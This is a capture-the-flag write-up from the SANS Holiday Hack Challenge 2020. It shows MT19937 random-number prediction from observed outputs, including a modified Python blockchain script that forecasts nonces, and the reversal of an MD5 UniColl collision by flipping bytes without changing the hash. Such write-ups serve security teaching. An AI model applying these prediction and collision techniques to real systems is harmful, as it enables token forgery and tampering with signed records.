<p><strong>624 seeds in view source</strong></p>
<p>Keep all the 624 seeds in the data.txt.</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-55.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-55.png?w=167" /></a></p>
<p>Create a new bash script "predict-next-seed.sh" which would take the data in the data.txt, apply mt19937 on it and predict next set of numbers in predicted.txt</p>
<h1 id="binbash_1">!/bin/bash</h1>
<p>cat data.txt | mt19937predict &gt; predicted.txt</p>
<p>Run the bash script for a very small time (0.1 sec).</p>
<p>timeout 0.1s ./predict-next-seed.sh</p>
<p>The first entry in the output predicted.txt is the next seed.</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-56.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-56.png?w=642" /></a></p>
<p><strong>The predicted next seed after 624 seeds is 476691297</strong></p>
<p>Login using the username 476691297 in an easy game.<br />
Win the easy game. <strong>Record the moves.</strong></p>
<p><strong>Use the same moves made in the easy window in the impossible window</strong>.</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-58.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-58.png?w=726" /></a></p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-60.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-60.png?w=833" /></a></p>
<h2 id="new-hints-unlocked">New hints unlocked!!</h2>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-61.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-61.png?w=1024" /></a></p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-62.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-62.png?w=271" /></a></p>
<h1 id="objective-11b-naughtynice-list-with-blockchain-investigation-part-2">Objective 11b): Naughty/Nice List with Blockchain Investigation Part 2</h1>
<h2 id="answer-fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb">Answer: fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb</h2>
<h2 id="high-level-approach_4">High level approach :</h2>
<ol>
<li>Change naughty_nice.py:<ul>
<li>Get Jake’s Block from the chain and save it as a binary (block.dat)</li>
<li>Extract all the docs from the Jake’s block</li>
</ul>
</li>
<li>Determine and extract the original naughty document.<br />
    This is the document Jake modified to put nice list on it. – This would be the 1st byte on the Jake’s block which he changed.<br />
    ref: <strong><a href="https://speakerdeck.com/ange/colltris?slide=194">https://speakerdeck.com/ange/colltris?slide=194</a></strong></li>
<li>Determine the flag for naughty/nice.<br />
    This is the flag which Jake changed from naughty to nice – this would-be 2nd byte on the Jake’s block which he changed.</li>
<li>Determine 3rd and 4th byte which were changed by Jake<br />
    ref: <a href="https://speakerdeck.com/ange/colltris?slide=109">https://speakerdeck.com/ange/colltris?slide=109</a></li>
<li>Make changes on 1st, 2nd, 3rd and 4th byte on Jake’s block making sure the MD5 hash does not change</li>
<li>Save the original block restored from Jack’s block and save as block_restored.dat file.</li>
<li>Calculate the SHA256 of the blockchain_restored.dat.</li>
</ol>
<h2 id="process_16">Process :</h2>
<h3 id="changes-to-naughty_nicepy">Changes to naughty_nice.py:</h3>
<p>Added a function named full_hash_SHA256() which will calculate the SHA256 hash of the block. <strong>Screenshot 1 below.</strong><br />
Added code to calculate the SHA256 hash for each block and If Its equal to the 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f, it saves the block to a new file named block.dat.<br />
It also extracts all the documents from the Jack’s block - 129459.pdf and 129459.bin <strong>Screenshot 2 below.</strong></p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-63.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-63.png?w=561" /></a></p>
<p><strong>Screenshot 1</strong></p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-64.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-64.png?w=524" /></a></p>
<p><strong>Screenshot 2</strong></p>
<h2 id="the-whole-naughty_nicepy">The whole naughty_nice.py</h2>
<pre><code class="language-python">#!/usr/bin/env python3
'''
So, you want to work with the naughty/nice blockchain?
Welcome!  
This python module is your first step in that process. It will introduce you to how the Naughty/Nice
blockchain is structured and how we at the North Pole use blockchain technology. The North Pole
has been using blockchain technology since Santa first invented it back in the 1960's. (Jolly
prankster that he is, Santa posted a white paper on the Internet that he wrote under a pseudonym
describing a non-Naughty/Nice application of blockchains a dozen or so years back. It caused quite
a stir...)
Important note: This module will NOT allow you to add content to the Official Naughty/Nice Blockchain!
That can only be done through the Official Naughty/Nice Website, which passes new blocks to the Official
Santa Signature System (OS3) that applies a digital signature to the content of each block before it is
added to the chain. Only blocks whose contents have been digitally signed by that system are placed on
the Naughty/Nice blockchain.
Note: If you're authorized to use the Official Naughty/Nice website, you will have been given a login and
password for that site after completing your training as a part of Elf University's &quot;Assessing and
Evaluating Human Behavior for Naughty/Niceness&quot; Curriculum.
This code is used to introduce how blocks/chains are created and allow you to view and/or validate 
portions (or the entirety) of the Official Naughty/Nice Blockchain.
A blockchain, while a part of the whole cryptocurrency &quot;fad&quot; that a certain pseudonym-packing North Pole
resident appears to have begun, are certainly not limited to that use. A blockchain can be used anywhere
that a record of information or transactions need to be maintained in a way that cannot be altered. And
really, what information is more important (and necessarily unalterable) than acts of Naughty/Niceness?
A blockchain works by linking each record together with the previous record. Each block's data contains
a cryptographic hash of the previous block's data. Because a block cannot be altered without altering
the cryptographic hash of its contents, any alteration of the data within a block will be immediately
evident, because every following block will no longer be valid.
In addition to this built-in property of a blockchain, the Official Naughty/Nice Blockchain has a few
other safeguards. The cryptographic hash of each block is signed using the Official Santa Signature
System (OS3). Currently, the Official Naughty/Nice Blockchain uses MD5 as its hashing algorithm, but
plans are in place to move to SHA256 in 2021. This update is part of a phased process to modernize
the blockchain code. In 2019, the entire blockchain system was ported from the original COBOL code to
Python3. Because of concerns about hash collisions in MD5, in the new Python3 code, a 64-bit random 
&quot;nonce&quot; was added to the beginning of each block at the time of creation.
This module represents a portion of the most current blockchain codebase. It consists of two classes,
one for the creation of blocks, called Block(), and one for the creation, examination, and verification of
chains of blocks, called Chain(). 
The following is an overview of the functionality provided by these classes:
The Chain() class is where most blockchain work is performed. It is designed to be as &quot;block-agnostic&quot;
as possible, so it can be used with blocks that hold different types of data. To use a different type
of block, you simply replace (or subclass) the Block() class. For this to work, there are several
functions that MUST be supplied by the Block() class. Let's take a look at those.
The Block() class MUST supply the following functions, used by the Chain() class:
    create\_genesis\_block() - This creates a very special block used at the beginning of the blockchain,
    and known as the &quot;genesis&quot; block. Because it has no previous block to reference it is, by definition,
    always considered valid. This block uses an agreed-upon, fake previous hash value.
    verify\_types() - Because the Chain() class is block-agnostic, it needs the Block() class to validate
    that a block contains valid data. This function returns True or False.
    block\_data() - a function that returns a representation of all of the data in the block that is to
    be hashed and signed. The data is returned as a Python3 bytes object.
    full\_block\_data() - a function that returns a representation of the entire block, including any
    hashes and signatures. A hash of this data is what is used as the &quot;previous hash&quot; value in the
    subsequent block. This data is returned as a Python3 bytes object. This function is also used
    when saving either the entire blockchain to a file, or a single block to a file
    load\_a\_block(\[filehandle\]) - this function takes a filehandle and returns a block at a time for
    addition to the block chain. This function DOES NOT verify blocks. This function throws a
    Value\_Error exception when it either encounters the end of the file or unparsable data.
The Naughty/Nice Block() class also defines a utility function:
    dump\_doc(\[document number\]) - this will dump the indicated supporting document to a file named
    as &lt;block\_index&gt;.&lt;data\_type\_extension&gt;. Note: this function will overwrite any existing file 
    with that name, so if there are multiple documents (there can be up to 9) of the same type 
    affixed to a record, it is the responsibility of the calling process to rename them as appropriate.
The Chain() class provides the following functions:
    add\_block(\[block\_data\]) - passes a block\_data dictionary to the Block() initialization code.
    This function, being &quot;block-agnostic&quot; simply passes the block\_data along. It is up to the Block()
    initialization code to validate this data.
    verify\_chain(\[public\_key\], &lt;beginning hash&gt;) - steps through every block in the chain and
    verifies that the data in each block is of the correct type, that the block index is correct,
    that the block contains the correct hash for the previous block, and that the block signature
    is a valid signature based on the hash of the block data. It then hashes the full block for use
    as the &quot;previous hash&quot; on the next block. This returns True or False. (If False, it prints
    information about what, specific, issues were found and the block that triggered the issue.)
    Note: If you're working with a portion of the block chain that does not begin with a genesis
    block, you'll need to provide a value for the previous block's hash for this function to
    work.
    save\_a\_block(index, &lt;filename&gt;) - saves the block at index to the filename provided, or to 
    &quot;block.dat&quot; if no filename is given.
    save\_chain(&lt;filename&gt;) - saves the chain to the filename provided, or to &quot;blockchain.dat&quot; if
    no filename is given.
    load\_chain(&lt;filename&gt;) - loads a chain from the filename provided, or from &quot;blockchain.dat&quot; if
    no filename is given. This returns the count of blocks loaded. This DOES NOT verify that the
    data loaded is a valid blockchain. It is recommended to call verify\_chain() immediately after
    loading a new chain.   
An overview of how we process the Official Naughty/Nice Blockchain:
There are approximately 7.8 billion people and magical beings on Earth, and each one is tracked
24 hours a day throughout the year by a fleet of Elves-On-The-Shelves. While those elves are
clearly visible during the Holiday season, don't be fooled into believing that we're only tracking
Naughty/Niceness at that time. On average, each of the billions of subjects that we monitor are
performing some sort of Naughty or Nice activity that rises to the level of being scored on the
blockchain around 2.1 times per week. Keeping track of all of that activity on a single blockchain
would be incredibly processing intensive (that would be ~1^12 blocks/year, or 32,000 blocks/second),
so we've broken our record-keeping into 1,000 different blockchains. If you do the math, you'll find
that each of the blockchains is now responsible for between 1,500 and 2000 blocks per minute, which
is a reasonable load. A separate database keeps track of which Personal ID (pid) is assigned to each
of the blockchains.
Throughout the year, we periodically run each of the chains to determine who is the best (and worst)
of our subjects. While only the final Holiday run is used to determine who is getting something
good in their stockings and who is getting a lump of coal, it's always interesting to see a listing
of the Nicest and Naughtiest folks out there. 
Please note: Wagering on the results of the Official Naughty/Nice Blockchain is STRICTLY PROHIBITED.
If you intend to use your access to the Official Naughty/Nice Blockchain code to facilitate any sort
of gambling, you will be racking up a whole bunch of Naughtiness points. YOU HAVE BEEN WARNED! (I'm
looking at you, Alabaster Snowball...)
For this reason, we have not provided any code that will perform a computation of Naughty/Nice
points. Additionally, for privacy reasons, there is also no code to pull the records associated
with specific individuals from this list. While the creation of that code would not be difficult,
you are honor-bound to use your access to this list for only good and noble purposes.
Signing Keys - Information
We have provided you with an example private key that you can use when generating your own blockchains
for test purposes. This private key (which also contains the public key information) is called 
private.pem.
Additionally, we have provided you with a copy of the public key used to verify the Official
Naughty/Nice Blockchain. This is the public key component of the private key used by the Official
Santa Signature System (OS3) to sign blocks on the Official Naughty/Nice Blockchain. This key
is contained in the file official\_public.pem.
'''
import random
from Crypto.Hash import MD5, SHA256
from Crypto.PublicKey import RSA
from Crypto.Signature import PKCS1\_v1\_5
from base64 import b64encode, b64decode
import binascii
import time
import itertools
from mt19937predictor import MT19937Predictor
genesis\_block\_fake\_hash = '00000000000000000000000000000000'
data\_types = {1:'plaintext', 2:'jpeg image', 3:'bmp image', 4:'gif image', 5:'PDF', 6:'Word', 7:'PowerPoint', 8:'Excel', 9:'tiff image', 10:'MP4 video', 11:'MOV video', 12:'WMV video', 13:'FLV video', 14:'AVI video', 255:'Binary blob'}
data\_extension = {1:'txt', 2:'jpg', 3:'bmp', 4:'gif', 5:'pdf', 6:'docx', 7:'pptx', 8:'xlsx', 9:'tiff', 10:'mp4', 11:'mov', 12:'wmv', 13:'flv', 14:'avi', 255:'bin'}
Naughty = 0
Nice = 1
class Block():
    def \_\_init\_\_(self, index=None, block\_data=None, previous\_hash=None, load=False, genesis=False):
        if(genesis == True):
            return None
        else:
            self.data = \[\]
            if(load == False):
                if all(p is not None for p in \[index, block\_data\['documents'\], block\_data\['pid'\], block\_data\['rid'\], block\_data\['score'\], block\_data\['sign'\], previous\_hash\]):
                    self.index = index
                    if self.index == 0:
                        self.nonce = 0 # genesis block
                    else:
                        self.nonce = random.randrange(0xFFFFFFFFFFFFFFFF)
                    self.data = block\_data\['documents'\]
                    self.previous\_hash = previous\_hash
                    self.doc\_count = len(self.data)
                    self.pid = block\_data\['pid'\]
                    self.rid = block\_data\['rid'\]
                    self.score = block\_data\['score'\]
                    self.sign = block\_data\['sign'\]
                    now = time.gmtime()
                    self.month = now.tm\_mon
                    self.day = now.tm\_mday
                    self.hour = now.tm\_hour
                    self.minute = now.tm\_min
                    self.second = now.tm\_sec
                    self.hash, self.sig = self.hash\_n\_sign()
                else:
                    return None
    def \_\_eq\_\_(self, other):
        if isinstance(other, self.\_\_class\_\_):
            return self.\_\_dict\_\_ == other.\_\_dict\_\_
        else:
            return False
    def \_\_repr\_\_(self):
        s = 'Chain Index: %i\\n' % (self.index)
        s += '              Nonce: %s\\n' % ('%016.016x' % (self.nonce))
        s += '                PID: %s\\n' % ('%016.016x' % (self.pid))
        s += '                RID: %s\\n' % ('%016.016x' % (self.rid))
        s += '     Document Count: %1.1i\\n' % (self.doc\_count)
        s += '              Score: %s\\n' % ('%08.08x (%i)' % (self.score, self.score))
        n\_n = 'Naughty'
        if self.sign &gt; 0:
            n\_n = 'Nice'
        s += '               Sign: %1.1i (%s)\\n' % (self.sign, n\_n)
        c = 1
        for d in self.data:
            s += '         Data item: %i\\n' % (c)
            s += '               Data Type: %s (%s)\\n' % ('%02.02x' % (d\['type'\]), data\_types\[d\['type'\]\])
            s += '             Data Length: %s\\n' % ('%08.08x' % (d\['length'\]))
            s += '                    Data: %s\\n' % (binascii.hexlify(d\['data'\]))
            c += 1
        s += '               Date: %s/%s\\n' % ('%02.02i' % (self.month), '%02.02i' % (self.day))
        s += '               Time: %s:%s:%s\\n' % ('%02.02i' % (self.hour), '%02.02i' % (self.minute), '%02.02i' % (self.second))
        s += '       PreviousHash: %s\\n' % (self.previous\_hash)
        s += '  Data Hash to Sign: %s\\n' % (self.hash)
        s += '          Signature: %s\\n' % (self.sig)
        return(s)
    def full\_hash(self):
        hash\_obj = MD5.new()
        hash\_obj.update(self.block\_data\_signed())
        return hash\_obj.hexdigest()
    def hash\_n\_sign(self):
        hash\_obj = MD5.new()
        hash\_obj.update(self.block\_data())
        signer = PKCS1\_v1\_5.new(private\_key)
        return (hash\_obj.hexdigest(), b64encode(signer.sign(hash\_obj)))
    def block\_data(self):
        s = (str('%016.016x' % (self.index)).encode('utf-8'))
        s += (str('%016.016x' % (self.nonce)).encode('utf-8'))
        s += (str('%016.016x' % (self.pid)).encode('utf-8'))
        s += (str('%016.016x' % (self.rid)).encode('utf-8'))
        s += (str('%1.1i' % (self.doc\_count)).encode('utf-8'))
        s += (str(('%08.08x' % (self.score))).encode('utf-8'))
        s += (str('%1.1i' % (self.sign)).encode('utf-8'))
        for d in self.data:
            s += (str('%02.02x' % d\['type'\]).encode('utf-8'))
            s += (str('%08.08x' % d\['length'\]).encode('utf-8'))
            s += d\['data'\]
        s += (str('%02.02i' % (self.month)).encode('utf-8'))
        s += (str('%02.02i' % (self.day)).encode('utf-8'))
        s += (str('%02.02i' % (self.hour)).encode('utf-8'))
        s += (str('%02.02i' % (self.minute)).encode('utf-8'))
        s += (str('%02.02i' % (self.second)).encode('utf-8'))
        s += (str(self.previous\_hash).encode('utf-8'))
        return(s)
    def block\_data\_signed(self):
        s = self.block\_data()
        s += bytes(self.hash.encode('utf-8'))
        s += self.sig
        return(s)
    def load\_a\_block(self, fh):
        self.index = int(fh.read(16), 16)
        self.nonce = int(fh.read(16), 16)
        self.pid = int(fh.read(16), 16)
        self.rid = int(fh.read(16), 16)
        self.doc\_count = int(fh.read(1), 10)
        self.score = int(fh.read(8), 16)
        self.sign = int(fh.read(1), 10)
        count = self.doc\_count
        while(count &gt; 0):
            l\_data = {}
            l\_data\['type'\] = int(fh.read(2),16)
            l\_data\['length'\] = int(fh.read(8), 16)
            l\_data\['data'\] = fh.read(l\_data\['length'\])
            self.data.append(l\_data)
            count -= 1
        self.month = int(fh.read(2))
        self.day = int(fh.read(2))
        self.hour = int(fh.read(2))
        self.minute = int(fh.read(2))
        self.second = int(fh.read(2))
        self.previous\_hash = str(fh.read(32))\[2:-1\]
        self.hash = str(fh.read(32))\[2:-1\]
        self.sig = fh.read(344)
        return self
    def create\_genesis\_block(self):
        block\_data = {}
        documents = \[\]
        doc = {}
        doc\['data'\] = bytes('Genesis Block'.encode('utf-8'))
        doc\['type'\] = 1
        doc\['length'\] = len(doc\['data'\])
        documents.append(doc)
        block\_data\['documents'\] = documents
        block\_data\['pid'\] = 0
        block\_data\['rid'\] = 0
        block\_data\['score'\] = 0
        block\_data\['sign'\] = Nice
        b = Block(0, block\_data, genesis\_block\_fake\_hash)
        return b
    def verify\_types(self):  # check data types of all info in a block
        rv = True
        instances = \[self.index, self.nonce, self.pid, self.rid, self.month, self.day, self.hour, self.minute, self.second, self.previous\_hash, self.score, self.sign\]
        types = \[int, int, int, int, int, int, int, int, int, str, int, int\]
        if not sum(map(lambda inst\_, type\_: isinstance(inst\_, type\_), instances, types)) == len(instances):
            rv = False
        for d in self.data:
            if not isinstance(d\['type'\], int):
                rv = False
            if not isinstance(d\['length'\], int):
                rv = False
            if not isinstance(d\['data'\], bytes):
                rv = False
        return rv
    def dump\_doc(self, doc\_no):
        filename = '%s.%s' % (str(self.index), data\_extension\[self.data\[doc\_no - 1\]\['type'\]\])
        with open(filename, 'wb') as fh:
            d = self.data\[doc\_no - 1\]\['data'\]
            fh.write(d)
        print('Document dumped as: %s' % (filename))
class Chain():
    nonce\_list = \[\] 
    index = 0
    initial\_index = 0
    last\_hash\_value = ''
    def \_\_init\_\_(self, load=False, filename=None):
        if not load:
            self.blocks = \[Block(genesis=True).create\_genesis\_block()\]
            self.last\_hash\_value = self.blocks\[0\].full\_hash()
        else:
            self.blocks = \[\]
            self.load\_chain(filename)
            self.index = self.blocks\[-1\].index
            self.initial\_index = self.blocks\[0\].index
    def \_\_eq\_\_(self, other):
        if isinstance(other, self.\_\_class\_\_):
            return self.\_\_dict\_\_ == other.\_\_dict\_\_
        else:
            return False
    def add\_block(self, block\_data):
        self.index += 1
        b = Block(self.index, block\_data, self.last\_hash\_value)
        self.blocks.append(b)
        self.last\_hash\_value = b.full\_hash() 
    def verify\_chain(self, publickey, previous\_hash=None):
        flag = True
        # unless we're explicitly told what the initial last hash should be, we assume that
        # the initial block will be the genesis block and will have a fixed previous\_hash
        if previous\_hash is None:
            previous\_hash = genesis\_block\_fake\_hash
        for i in range(0, len(self.blocks)):  # assume Genesis block integrity
            block\_no = self.blocks\[i\].index
            if not self.blocks\[i\].verify\_types():
                flag = False
                print(f'\\n\*\*\* WARNING \*\*\* Wrong data type(s) at block {block\_no}.')
            if self.blocks\[i\].index != i + self.initial\_index:
                flag = False
                print(f'\\n\*\*\* WARNING \*\*\* Wrong block index at what should be block {i + self.initial\_index}: {block\_no}.')
            if self.blocks\[i\].previous\_hash != previous\_hash:
                flag = False
                print(f'\\n\*\*\* WARNING \*\*\* Wrong previous hash at block {block\_no}.')
            hash\_obj = MD5.new()
            hash\_obj.update(self.blocks\[i\].block\_data())
            signer = PKCS1\_v1\_5.new(publickey)
            if signer.verify(hash\_obj, b64decode(self.blocks\[i\].sig)) is False:
                flag = False
                print(f'\\n\*\*\* WARNING \*\*\* Bad signature at block {block\_no}.')
            if flag == False:
                print(f'\\n\*\*\* WARNING \*\*\* Blockchain invalid from block {block\_no} onward.\\n')
                return False
            previous\_hash = self.blocks\[i\].full\_hash()
        return True
    def save\_a\_block(self, index, filename=None):
        if filename is None:
            filename = 'block.dat'
        with open(filename, 'wb') as fh:
            fh.write(self.blocks\[index\].block\_data\_signed())
    def save\_chain(self, filename=None):
        if filename is None:
            filname = 'blockchain.dat'
        with open(filename, 'wb') as fh:
            i = 0
            while(i &lt; len(self.blocks)):
                fh.write(self.blocks\[i\].block\_data\_signed())
                i += 1
    def load\_chain(self, filename=None):
        count = 0
        if filename is None:
            filename = 'blockchain.dat'
        with open(filename, 'rb') as fh:
            while(1):
                try:
                    self.blocks.append(Block(load=True).load\_a\_block(fh))
                    self.index = self.blocks\[-1\].index
                    count += 1
                except ValueError:
                    return count
if \_\_name\_\_ == '\_\_main\_\_':
    with open('private.pem', 'rb') as fh:
        private\_key = RSA.importKey(fh.read())
    public\_key = private\_key.publickey()
    c1 = Chain()
    for i in range(9):
        block\_data = {}
        documents = \[\]
        doc = {}
        doc\['data'\] = bytes(('This is block %i of the naughty/nice blockchain.' % (i)).encode('utf-8'))
        doc\['type'\] = 1
        doc\['length'\] = len(doc\['data'\])
        documents.append(doc)
        block\_data\['documents'\] = documents
        block\_data\['pid'\] = 123 # this is the pid, or &quot;person id,&quot; that the block is about
        block\_data\['rid'\] = 456 # this is the rid, or &quot;reporter id,&quot; of the reporting elf
        block\_data\['score'\] = 100 # this is the Naughty/Nice score of the report
        block\_data\['sign'\] = Nice # this indicates whether the report is about naughty or nice behavior
        c1.add\_block(block\_data)
    print(c1.blocks\[3\])
    print('C1: Block chain verify: %s' % (c1.verify\_chain(public\_key)))
#Note: This is how you would load and verify a blockchain contained in a file called blockchain.dat
#
    with open('official\_public.pem', 'rb') as fh:
        official\_public\_key = RSA.importKey(fh.read())
    c2 = Chain(load=True, filename='blockchain.dat')
    print('C2: Block chain verify: %s' % (c2.verify\_chain(official\_public\_key)))
    print(c2.blocks\[0\])
    c2.blocks\[0\].dump\_doc(1)
    predictor = MT19937Predictor()
    nonce\_list= \[\]
    # Adding all the nonces of all the blocks in a list
    for i in range(len(c2.blocks)):
         nonce\_list.append(c2.blocks\[i\].nonce)

    # reeversing the list
    nonce\_list.reverse()
    # get the first 625 nonces
    last\_625\_block\_nonce = list(itertools.islice(nonce\_list,625))
    # reverse the list so we get the last 625 nonces
    last\_625\_block\_nonce.reverse()
   # Setting the data for 625 nonces to the MT19937Predictor
    for nonce in last\_625\_block\_nonce:
        predictor.setrandbits(nonce, 64)
    # calcutated nonce and added for block 12997 \[lietarally ran the code at this point to get the nonce for block 12997 using predictor.getrandbits()\]
    predictor.setrandbits(13205885317093879758,64)
    # calculated nonce and added for block 12998 \[lietarally ran the code at this point to get the nonce for block 12997 using predictor.getrandbits()\]
    predictor.setrandbits(109892600914328301,64)
    # calculated nonce and added for block 12999 \[lietarally ran the code at this point to get the nonce for block 12997 using predictor.getrandbits()\]
    predictor.setrandbits(9533956617156166628,64)
    # Get the nonce for block 13000
    print(predictor.getrandbits(64))
</code></pre>
<h2 id="determine-and-extract-the-original-naughty-document">Determine and extract the original naughty document:</h2>
<p>Below is part of the 129459.pdf - Jack’s document (obviously a nice one!)</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-65.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-65.png?w=1024" /></a></p>
<p><strong>Nice document for Jack Frost</strong></p>
<p>Open the file 129549.pdf in an online hex editor [<a href="https://hexed.it/">https://hexed.it/</a>] and make changes (See right side)<br />
Ref: <a href="https://speakerdeck.com/ange/colltris?slide=194">https://speakerdeck.com/ange/colltris?slide=194</a></p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-66.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-66.png?w=1024" /></a></p>
<p><strong>PDF which Jack Frost had (left, the nice list) and the recovered PDF (right, the naughty list)</strong></p>
<p>Save the changes as a different PDF file. Open and you see the different PDF – the naughty list, the original one meant for Jack Frost.</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-67.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-67.png?w=1024" /></a></p>
<p><strong>The naughty list for Jack Frost</strong></p>
<h2 id="determine-the-flag-for-naughtynice-in-the-jacks-block">Determine the flag for naughty/nice in the Jack’s block :</h2>
<p>Open the Jack’s block file in online hex editor and compare the text version of the block to find the nice/naughty flag.<br />
Jake must have changed this from 0 (original which means naughty) to 1 (nice).</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-68.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-68.png?w=1024" /></a></p>
<p><strong>The position of the naughty nice flag in the hex for the PDF</strong></p>
<h2 id="determine-3rd-and-4th-byte-which-were-changed-by-jake">Determine 3rd and 4th byte which were changed by Jake :</h2>
<p>At this point, we have two bytes identified – one for the PDF page number and another for nice/naughty flag.</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-69.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-69.png?w=542" /></a></p>
<p><strong>The 3rd and 4th bytes identified</strong></p>
<p>Following the Unicoll computation technique as noted in <a href="https://speakerdeck.com/ange/colltris?slide=109">https://speakerdeck.com/ange/colltris?slide=109</a><br />
The 1st byte – This is the nice/naughty flag we decreased by 1 (31 to 30)<br />
The 2ndByte – This would be the 10th byte of the next block which we need to increase by 1 (D6 to D7)<br />
The 3rd Byte – This is the PDF page number which we increased by 1 (32 to 33)<br />
The 4th Byte – This would be the 10th byte of the next block which we need to decrease by 1 (1C to 1B)</p>
<p>Please see the screenshot below for the all changes:<br />
left side is Jake's block (block.dat)<br />
right side is original block which Jake changed (block_restored.dat) - changes in bytes noted below.</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-70.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-70.png?w=945" /></a></p>
<p><strong>Jack's block (left) and original block restored which Jack changed (right)</strong> - <strong>remember</strong>, <strong>the MD5 for both is still same!</strong></p>
<p>Jake was able to change the original block without changing the hash. His block’s MD5 has was b10b4a6bd373b61f32f4fd3a0cdfbf84<br />
We needed to undo his changes and restore the original block, without changing the MD5 hash.<br />
As you can see with the below changes, the hashes still don’t change.</p>
<p><strong>MD5 Hash of Jake's block (block.dat) - b10b4a6bd373b61f32f4fd3a0cdfbf84</strong></p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-76.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-76.png?w=963" /></a></p>
<p><strong>MD5 Hash of Jake's block (block.dat) - b10b4a6bd373b61f32f4fd3a0cdfbf84</strong></p>
<p><strong>MD5 Hash of original block (block_restored.dat) - b10b4a6bd373b61f32f4fd3a0cdfbf84</strong></p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-78.png"><img alt="" src="images/image-76.png" /></a><strong>MD5 Hash of original block which Jack modified (block_restored.dat) - b10b4a6bd373b61f32f4fd3a0cdfbf84</strong></p>
<p>Now we just need to save the changes in a new file block_restored.dat and calculate the SHA256 hash of it.</p>
<p><strong>SHA256 of the block_restored.dat</strong></p>
<p>fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-80.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-80.png?w=952" /></a></p>
<p><strong>SHA256 of the restored block - fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb</strong></p>
<p><strong>The below zip file contains the changed naughty_nice.py (please remove .txt after extraction)</strong></p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/11b_naughty_nice_changed.py_.zip">11b_naughty_nice_changed.py</a><a href="https://ashishrocks.files.wordpress.com/2021/01/11b_naughty_nice_changed.py_.zip">Download</a></p>
<h1 id="all-objectives-are-completed-now">All objectives are completed now</h1>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-96.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-96.png?w=798" /></a></p>
<h1 id="all-narratives-have-been-unlocked">All narratives have been unlocked</h1>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-97.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-97.png?w=797" /></a></p>
<h1 id="the-best-part">The best part!</h1>
<p>After completing all the objectives, you go to Santa's office.<br />
Tinsel Upatree says "Quickly go out to the balcony to be recognized"!!</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-92.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-92.png?w=465" /></a></p>
<p>You go the roof and and congratulations are in order!!!!</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-98.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-98.png?w=900" /></a></p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-94.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-94.png?w=965" /></a></p>
<p>Jack's plan is foiled!</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-95.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-95.png?w=914" /></a></p>
<h1 id="the-exclusive-winner-hoodie">The exclusive winner hoodie :</h1>
<p>I got myself the exclusive Holiday Hack challenge 2020 winner hoodie!</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/20210117_104649.jpg"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/20210117_104649.jpg?w=768" /></a></p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/20210117_104737.jpg"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/20210117_104737.jpg?w=768" /></a></p></div>
            </div>
        </div>

        <footer class="col-md-12">
            <hr>
            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
        </footer>
        <script>
            var base_url = "../../..",
                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
        </script>
        <script src="../../../js/base.js" defer></script>
        <script src="../../../search/main.js" defer></script>

        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header">
